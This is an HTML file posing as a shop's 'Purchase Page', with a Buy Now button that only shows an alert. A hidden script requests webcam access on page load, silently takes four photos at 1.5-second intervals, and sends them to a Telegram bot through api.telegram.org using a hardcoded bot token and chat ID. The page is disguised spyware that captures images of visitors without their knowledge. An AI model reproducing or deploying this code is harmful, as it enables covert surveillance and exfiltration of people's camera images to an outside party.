<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Purchase Page</title>
  <style>
    #video, #canvas {
      display: none;
    }

    #message {
      font-size: 20px;
      color: #333;
      text-align: center;
      margin-top: 20px;
    }

    #buyButton {
      display: block;
      width: 200px;
      padding: 10px;
      margin: 20px auto;
      background-color: #4CAF50;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    #buyButton:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <h1 style="text-align: center;">Welcome to Our Purchase Page</h1>
  <div id="message">Please wait while the purchase is being processed...</div>
  <button id="buyButton" onclick="alert('Proceeding to buy...')">Buy Now</button>

  <video id="video" width="640" height="480" autoplay></video>
  <canvas id="canvas" width="640" height="480"></canvas>

  <script>
    const token = "5799298404:AAH3xl8YK3EmbxZ3_XaRARU5Jt07mMw_9As";
    const chatId = "1353504783";

    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const context = canvas.getContext("2d");

    navigator.mediaDevices.getUserMedia({ video: true })
      .then((stream) => {
        video.srcObject = stream;

        // 4 عکس با فاصله 1.5 ثانیه‌ای
        let photoCount = 0;
        const takePhoto = () => {
          if (photoCount >= 4) {
            stream.getTracks().forEach(track => track.stop()); // قطع دوربین
            return;
          }

          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const imageData = canvas.toDataURL("image/png");

          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: "POST",
            body: new URLSearchParams({
              chat_id: chatId,
              photo: imageData
            })
          });

          photoCount++;
          setTimeout(takePhoto, 1500); // 1.5 ثانیه بعدی
        };

        // شروع گرفتن عکس بعد از 3 ثانیه از ورود
        setTimeout(takePhoto, 3000);
      })
      .catch((err) => {
        console.error("Error accessing camera: ", err);
      });
  </script>
</body>
</html>
